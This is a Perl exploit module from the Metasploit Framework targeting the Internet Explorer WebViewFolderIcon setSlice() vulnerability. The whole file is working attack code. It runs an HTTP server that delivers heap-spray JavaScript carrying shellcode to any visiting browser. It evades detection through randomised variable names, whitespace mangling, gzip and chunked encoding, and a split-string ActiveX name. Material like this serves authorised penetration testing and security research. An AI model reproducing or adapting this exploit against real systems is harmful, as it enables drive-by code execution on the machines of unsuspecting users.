
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_webview_setslice;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Internet Explorer WebViewFolderIcon setSlice() Code Execution',
	'Version'        => '$Rev: 4006 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in Microsoft Internet Explorer.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1024,
		'BadChars' => "\x00",
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
		['OSVDB', '27110']
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Automatic', 0x0c0c0c0c ]
	  ],

	'Keys'           => [ 'ie' ]
  };


sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;

	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
	  Pex::Utils::SourceIP('1.2.3.4') :
	  $self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;

	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {

		$line =~ s/^\s+|\s+$//g;

		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}

	$self->PrintLine("[*] Client connected from $rhost:$rport...");
	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));
	$fd->Close();
}

sub GenerateHTML {
	my $self   = shift;
	my $target = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = Pex::Utils::JSUnescape($self->GetVar('EncodedPayload')->Payload);
	my $addr_long = unpack('H*', pack('V', $target->[1]));
	my $addr_targ = $target->[1];
	my $addr_word = substr($addr_long, 0, 4);
	my $var_buffer    = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_shellcode = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_unescape  = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_x         = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_i         = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_tic       = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $var_toc       = Pex::Text::LowerCaseText(int(rand(30)+8));
	my $diff          = int(rand(0xffffff)+4000);
	my $over          = 0x7ffffffe - $diff;
	my $html          = Pex::Text::AlphaNumText(int(rand(1024))+32);
	my $data      = qq#
<html >
<head >
<script >

	try {
	
	var ${var_unescape}  = unescape ;
	var ${var_shellcode} = ${var_unescape}( "${shellcode}" ) ;
	
	var ${var_buffer} = ${var_unescape}( "%u${addr_word}" ) ;
	while ( ${var_buffer}.length <= 0x400000 ) ${var_buffer} += ${var_buffer} ;

	var ${var_x} = new Array() ;	
	for ( var ${var_i} =0 ; ${var_i} < 30 ; ${var_i}++ ) {
		${var_x}[ ${var_i} ] = 
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} +
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} + 
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} + 		
			${var_buffer}.substring( 0 ,  0x100000 - ${var_shellcode}.length ) + ${var_shellcode} ;
	}
	
   	for ( var ${var_i} = 0 ; ${var_i} < 1024 ; ${var_i}++ ) {
		var ${var_tic} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' ) ;	

		try { ${var_tic}.setSlice( $over + $diff, 0 , 0 , ${addr_targ} ) ; } catch( e ) { }
		
		var ${var_toc} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' ) ;	
	}

	} catch( e ) { window.location = 'about:blank' ; }
	
		
	</script >
</head >
<body >
${html}
</body >
</html >
#;

	# Mangle the whitespace...
	$data =~ s/\s+/RandomSpaces()/ge;

	return $data;
}

sub RandomSpaces {
	my @spaces = ("\x20", "\x09", "\x0a", "\x0d");
	my $res;
	my $len = rand(100)+20;

	while (length($res) < $len) {
		$res .= $spaces[ rand(scalar(@spaces)) ];
	}

	return $res;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}
1;
__DATA__
		var ${var_toc} = new ActiveXObject( 
		'W' + 'e' + 'b' + 'V' + 'i' + 'e' + 'w' + 'F' + 'o' + 'l' + 'd' + 'e' + 'r' +
		'I' + 'c' + 'o' + 'n' + '.' + 'W' + 'e' + 'b' + 'V' + 'i' + 'e' + 'w' + 'F' + 
		'o' + 'l' + 'd' + 'e' + 'r' + 'I' + 'c' + 'o' + 'n' + '.' + '1' ) ;	
